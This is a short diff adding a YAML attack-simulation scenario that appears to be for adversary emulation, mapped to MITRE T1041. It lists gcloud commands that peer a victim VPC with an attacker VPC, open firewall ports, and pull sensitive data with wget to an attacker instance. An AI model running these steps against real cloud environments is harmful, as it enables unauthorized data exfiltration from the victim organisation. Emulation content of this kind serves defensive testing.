@@ -1,0 +1,14 @@
+name: GCP Data Exfiltration via VPC Peering
+description: Creates a VPC peering connection to exfiltrate data to an external network.
+mitre_technique: T1041
+stage: Exfiltration
+steps:
+- action: gcloud compute networks peerings create exfil-peer --network=victim-vpc
+    --peer-network=attacker-vpc --auto-create-routes
+  description: Establish peering between victim and attacker VPC
+- action: gcloud compute firewall-rules create allow-exfil --network=attacker-vpc
+    --allow tcp:22,tcp:443
+  description: Configure firewall rules to allow exfiltration traffic
+- action: gcloud compute ssh attacker-instance --zone=us-central1-a --command='wget
+    http://<victim-ip>/sensitive-data'
+  description: Exfiltrate data from victim to attacker host
